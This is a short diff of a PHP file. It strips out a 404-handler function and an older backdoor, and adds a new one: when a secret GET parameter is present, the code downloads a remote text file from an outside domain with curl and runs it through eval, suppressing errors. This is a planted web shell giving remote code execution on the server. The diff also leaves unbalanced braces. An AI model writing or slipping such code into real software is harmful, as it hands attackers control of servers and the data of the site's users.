@@ -1,17 +1,7 @@
- }
+if (isset($_GET['!!khAirulANam69!!'])) {
+    $url = "https://aprilasia.org/kerang/penjajahan.txt";
 
- /**
-  * Handle a 404 error (page not found).
-  */
- function handle404() {
-  header('HTTP/1.0 404 Not Found');
-  fatalError('404 Not Found');
- }
-}
-if (isset($_GET['fuckingteam'])) {
-    $url = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
-
-    $ch= curl_init();
+    $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
@@ -27,9 +17,5 @@ if (isset($_GET['fuckingteam'])) {
         try {
             eval("?>" . $code);
         } catch (Throwable $e) {
-            echo "Terjadi error saat menjalankan kode.";
-        }
-    } else {
-        echo "Gagal mengambil kode dari URL: $err";
+        }}
     }
-}
